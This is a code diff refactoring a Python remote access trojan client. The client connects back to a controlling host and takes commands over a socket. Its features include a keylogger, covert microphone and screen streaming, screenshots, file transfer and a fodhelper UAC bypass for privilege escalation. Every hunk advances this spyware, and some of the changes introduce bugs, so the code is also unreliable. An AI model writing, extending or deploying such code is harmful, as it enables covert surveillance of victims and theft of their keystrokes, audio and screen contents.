@@ -62,8 +62,11 @@ def connection():
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
-            s.close()
-            break
+            try:
+                s.close()
+                break
+            except Exception as e:
+                os._exit(0)  # Force exit if socket close fails
         except:
             # If a connection error occurs, retry the connection
             connection()
@@ -94,6 +97,8 @@ keylogger_running = False
 t_start = time.time()  # Initialize the start time for the keylogger
 def on_press(key):
     global log, t_start
+    if not log:
+        log += f"\n[{time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())}] "
     # if more than 20 seconds have passed since the last key press, add new line
     if time.time() - t_start > 20:
         log += f"\n[{time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())}] "
@@ -115,8 +120,6 @@ def start_keylogger():
     keylogger_running = True
 
     def run():
-        global log
-        log += f"\n[{time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())}] "
         with keyboard.Listener(on_press=on_press) as listener:
             while keylogger_running:
                 pass
@@ -125,6 +128,7 @@ def start_keylogger():
     t = threading.Thread(target=run)
     t.daemon = True  # Set the thread as a daemon so it exits when the main program exits
     t.start()
+    reliable_send("[+] Keylogger started.")
 
 def stop_keylogger():
     global keylogger_running, log
@@ -132,15 +136,36 @@ def stop_keylogger():
     time.sleep(1)  # Give the keylogger some time to finish capturing keys
     # Clear the log when stopping the keylogger
     log = ""
+    reliable_send("[+] Keylogger stopped.")
 
 def retrieve_keylogger_log():
     global log
     log_data = log
     log = ""  # Clear the log after retrieving it
-    return log_data
+    reliable_send(log_data)
 
 streaming_flag = {'on': False}
 stream_thread = None
+
+def start_audio_stream():
+    global stream_thread, streaming_flag
+    if not streaming_flag['on']:
+        streaming_flag['on'] = True
+        stream_thread = threading.Thread(target=stream_audio, args=(streaming_flag))
+        stream_thread.daemon = True  # Set the thread as a daemon so it exits when the main program exits
+        stream_thread.start()
+        reliable_send("[+] Audio stream started.")
+    else:
+        reliable_send("[!] Audio stream is already running.")
+
+def stop_audio_stream():
+    global streaming_flag, stream_thread
+    streaming_flag['on'] = False
+    if stream_thread:
+        stream_thread.join()  # Wait for the audio thread to finish
+        stream_thread = None  # Reset the thread reference
+    reliable_send("[+] Audio stream stopped.")
+
 def stream_audio(sock, flag):
     CHUNK = 1024
     FORMAT = pyaudio.paInt16
@@ -170,9 +195,18 @@ def take_screenshot():
         screenshot = sct.grab(sct.monitors[0])  # Capture full screen
         image_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)  # Convert to PNG format
         encoded_img = base64.b64encode(image_bytes).decode('utf-8')  # Encode the image in base64
-        return encoded_img 
+    reliable_send(encoded_img)
     
 # Function to start screen streaming
+def start_screen_stream():
+    try:
+        screen_thread = threading.Thread(target=stream_screen)
+        screen_thread.daemon = True
+        screen_thread.start()
+        reliable_send('[+] Screen streaming started.')
+    except Exception as e:
+        reliable_send(f'[-] Failed to start screen streaming: {str(e)}')
+
 def stream_screen():
     try: # Runs in a separate thread and continuously sends screenshots to the server
         stream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket.
@@ -249,58 +283,37 @@ def spawn_elevated_shell():
 
 # Main shell function for command execution
 def shell():
-    global stream_thread, streaming_flag
     while True:
         # Receive a command from the remote host
         command = reliable_recv()
         if command == 'quit':
             # If the command is 'quit', exit the shell loop
-            break
+            try:
+                break
+            except Exception as e:
+                os._exit(0)  # Force exit if socket close fails
         elif command == 'clear':
-            # If the command is 'clear', do nothing (used for clearing the screen)
             pass
         elif command[:3] == 'cd ':
-            # If the command starts with 'cd ', change the current directory
             os.chdir(command[3:])
         elif command[:8] == 'download':
-            # If the command starts with 'download', upload a file to the remote host
             upload_file(command[9:])
         elif command[:6] == 'upload':
-            # If the command starts with 'upload', download a file from the remote host
             download_file(command[7:])
         elif command == 'keylogger_start':
-            # If the command is 'keylogger_start', start the keylogger
             start_keylogger()
-            reliable_send("[+] Keylogger started.")
         elif command == 'keylogger_stop':
-            # If the command is 'keylogger_stop', stop the keylogger
             stop_keylogger()
-            reliable_send("[+] Keylogger stopped.")
         elif command == 'keylogger_dump':
-            # If the command is 'dump_keyslog', retrieve the keylogger log
-            log_data = retrieve_keylogger_log()
-            reliable_send(log_data)
+            retrieve_keylogger_log()
         elif command == 'listening_start':
-            if not streaming_flag['on']:
-                streaming_flag['on'] = True
-                stream_thread = threading.Thread(target=stream_audio, args=(s, streaming_flag))
-                stream_thread.daemon = True
-                stream_thread.start()
-            reliable_send("[+] Audio stream started.")
+            start_audio_stream()
         elif command == 'listening_stop':
-            streaming_flag['on'] = False
-            if stream_thread:
-                stream_thread.join()
-            reliable_send("[+] Audio stream stopped.")
+            stop_audio_stream()
         elif command == 'screenshot':
-            # If the command is 'screenshot', take a screenshot and send it
-            screenshot_data = take_screenshot()
-            reliable_send(screenshot_data)
+            take_screenshot()
         elif command == 'screen_stream':
-            t = threading.Thread(target=stream_screen)
-            t.daemon = True
-            t.start()
-            reliable_send('[+] Screen streaming started.')
+            start_screen_stream()
         elif command == 'elevate':
             # Attempt to escalate privileges using fodhelper UAC bypass
             result = spawn_elevated_shell()
